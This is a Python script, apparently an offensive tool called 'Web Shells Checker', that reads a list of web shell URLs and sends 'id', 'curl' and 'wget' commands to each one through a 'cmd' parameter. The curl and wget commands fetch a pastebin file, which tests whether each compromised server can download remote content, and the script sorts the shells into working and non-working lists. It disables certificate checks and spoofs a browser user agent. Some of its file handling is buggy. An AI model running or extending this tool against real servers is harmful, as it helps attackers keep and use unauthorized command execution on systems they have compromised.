import argparse
import sys
import time
import logging
from progress.bar import FillingSquaresBar

import requests
import pandas
import urllib3
from requests.adapters import HTTPAdapter, Retry
import http.client as http_client

# Suppress only the single warning from urllib3.
urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)

ascii_purple_color = "\x1b[38;5;13m"
ascii_green_color = "\x1b[32m"
ascii_red_color = "\x1b[1;31m"
reset_ascii_color = "\u001B[0m"
error_count_retries = 0
response_text_id = None
response_text_curl = None
response_text_wget = None


def parse_arguments():
    parser = argparse.ArgumentParser(description="Checks shell status")
    parser.add_argument('-l', help='Path to list with web shells', required=True)
    parser.add_argument('-debug', help='Added debug mode output.', required=False)
    parser.add_argument('-verbose', help='Added debug mode output.', required=False)
    parser.format_help()
    args = parser.parse_args()
    debug_mode = args.debug
    shells_list = args.l
    verbose = args.verbose
    if len(sys.argv) == 0 or shells_list == '' or args is None or len(sys.argv) > 3:
        parser.print_help()
        sys.exit(1)
    if debug_mode:
        http_client.HTTPConnection.debuglevel = 1
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.propagate = True
    if args.l.endswith('.txt'):
        check_status_txt_file(shells_list, verbose)
    if args.l.endswith('.csv'):
        check_status_csv_file(shells_list, verbose)


def check_status_txt_file(path, verbose):
    with (open(path) as txt_file):
        line_count = sum(1 for _ in txt_file)
        bar = FillingSquaresBar('Processing', max=line_count)
        for line in txt_file:
            bar.next()
            send_requests_and_check_responses(line, verbose)
    bar.finish()
    txt_file.close()


def check_status_csv_file(path, verbose):
    with (open(path, newline='') as csv_file):
        results = pandas.read_csv(csv_file, usecols=['url'])
        row_count = len(results)
        bar = FillingSquaresBar('Processing', max=row_count)
        for index in range(row_count):
            line = results.__array__().item(index)
            bar.next()
            send_requests_and_check_responses(line, verbose)
    bar.finish()
    csv_file.close()


def send_requests_and_check_responses(shell_url, verbose):
    global error_count_retries
    global response_text_id
    global response_text_curl
    global response_text_wget
    cmd_wget = "wget https://pastebin.com/raw/NYE0HT2k --output-document - | head -n1"
    cmd_id = "id"
    cmd_curl = "curl https://pastebin.com/raw/NYE0HT2k"
    # this command checks could file be downloaded and redirects output to stdout without saving it
    secret_message = "$2a$15$WNSlyUYj7TlpIXo.QAo/y.MTsitEwhm00gIIgHTJuc.GANQW9tgSC"

    file_with_working_shells = "working.txt"
    file_with_not_working_shells = "not_working.txt"

    with open(file_with_working_shells, 'w') as working_shells_file:
        with open(file_with_not_working_shells, 'w') as not_working_shells_file:
            if verbose:
                print(ascii_green_color + "Checking shell: " + shell_url + reset_ascii_color)

            session = requests.Session()
            session.max_redirects = 3
            retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
            session.mount('http://', HTTPAdapter(max_retries=retries))
            session.mount('https://', HTTPAdapter(max_retries=retries))
            session.headers.update({'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
                                                  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.3'})

            try:
                response_text_id = session.get(shell_url + f"?cmd={cmd_id}", timeout=7, verify=False).text
                response_text_curl = session.get(shell_url + f"?cmd={cmd_curl}", timeout=7, verify=False).text
                response_text_wget = session.get(shell_url + f"?cmd={cmd_wget}", timeout=7, verify=False).text
            except requests.exceptions.ConnectionError as exception:
                time.sleep(10)
                if error_count_retries < 5:
                    error_count_retries += 1
                    print(exception.__cause__)
                    print(f"\n Connection Error. Retry # {error_count_retries}....")
                    send_requests_and_check_responses(shell_url, verbose)

                else:
                    not_working_shells_file.flush()
                    working_shells_file.flush()
                    not_working_shells_file.write(shell_url + "\n")
                    exit(1)
            except requests.exceptions.TooManyRedirects:
                print("\n Too many redirects. Continue...")
                pass

            except IOError as error:
                print(error)
                time.sleep(10)
                if error_count_retries < 5:
                    error_count_retries += 1
                    print(
                        f"\n Error was occurred during execution. Check network connection. Retry # {error_count_retries}")
                    send_requests_and_check_responses(shell_url, verbose)
                else:
                    not_working_shells_file.flush()
                    working_shells_file.flush()
                    not_working_shells_file.close()
                    working_shells_file.close()
                    print("\n IO error. Exiting.")
                    exit(1)

            contains_uid = response_text_id.find("uid")
            contains_wget_file = secret_message in response_text_wget
            contains_curl_file = secret_message in response_text_curl
            if contains_uid != -1 and contains_curl_file and contains_wget_file:

                response_status = requests.get(shell_url + "?cmd=id").status_code
                if verbose:
                    print(ascii_green_color + "Shell " + shell_url + " is alive." + "\n" +
                          "Status code: " + str(response_status))
                    print("All necessary commands works." + reset_ascii_color)

                working_shells_file.write(shell_url + "\n")
                working_shells_file.flush()
            elif contains_uid != -1 or contains_curl_file or contains_wget_file:
                if verbose:
                    print(ascii_red_color + "Probably not all commands working." + reset_ascii_color)
                not_working_shells_file.write(shell_url + "\n")
                not_working_shells_file.flush()
            else:
                if verbose:
                    print(ascii_red_color + "Shell did not respond: " + shell_url + "\n" +
                          "Check path to shell or shell doesn't alive." + reset_ascii_color)
                not_working_shells_file.write(shell_url + "\n")
                not_working_shells_file.flush()

    not_working_shells_file.close()
    working_shells_file.close()


def print_banner():
    print(ascii_purple_color)
    print(' .---------------------------------------------------------------.' + "\n"
          ' |      O                                                        |' + "\n"
          ' |      |                                                        |' + "\n"               
          ' |0{XXXX}+===================================================>   |' + "\n"  
          ' |      |                                                        |' + "\n"
          ' |      O                                                        |' + "\n"                                                                     
          ' |---------------------------------------------------------------|' + "\n"                                                                     
          ' | __        _______ ____    ____  _   _ _____ _     _     ____  |' + "\n"
          ' | \\ \\      / / ____| __ )  / ___|| | | | ____| |   | |   / ___| |' + "\n"
          ' |  \\ \\ /\\ / /|  _| |  _ \\  \\___ \\| |_| |  _| | |   | |   \\___ \\ |' + "\n"
          ' |   \\ V  V / | |___| |_) |  ___) |  _  | |___| |___| |___ ___) ||' + "\n"
          ' |   _\\_/\\_/  |_____|____/ _|____/|_| |_|_____|_____|_____|____/ |' + "\n"
          ' |  / ___| | | | ____/ ___| |/ / ____|  _ \\                      |' + "\n"
          " | | |   | |_| |  _|| |   | ' /|  _| | |_) |                     |" + "\n"
          ' | | |___|  _  | |__| |___| . \\| |___|  _ <                      |' + "\n"
          ' |  \\____|_| |_|_____\\____|_|\\_\\_____|_| \\_\\                     |' + "\n"
          ' |                                                               |' + "\n"
          " '---------------------------------------------------------------'")
    print(reset_ascii_color)


if __name__ == '__main__':
    print_banner()
    parse_arguments()
